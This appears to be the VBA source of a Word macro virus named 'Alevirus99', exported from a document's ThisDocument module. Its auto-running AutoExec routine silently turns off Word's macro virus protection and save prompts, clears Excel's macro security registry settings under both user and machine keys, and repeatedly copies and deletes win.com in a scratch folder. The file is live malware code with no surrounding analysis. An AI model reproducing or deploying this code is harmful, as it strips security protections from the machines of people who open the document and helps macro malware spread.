   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub AutoExec()
   On Error Resume Next
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
   WordBasic.MkDir "c:\Alevirus99"
   WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
   WordBasic.Kill "c:\Alevirus99\*.*"
   WordBasic.RmDir "c:\Alevirus99"
   System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
   WordBasic.MkDir "c:\Alevirus99"
   WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
   WordBasic.Kill "c:\Alevirus99\*.*"
   WordBasic.RmDir "c:\Alevirus99"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
   WordBasic.MkDir "c:\Alevirus99"
   WordBasic.CopyFile "c:\windows\win.com", "c:\Alevirus99\win.com"
   WordBasic.Kill "c:\Alevirus99\*.*"
   WordBasic.RmDir "c:\Alevirus99"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
   End Sub
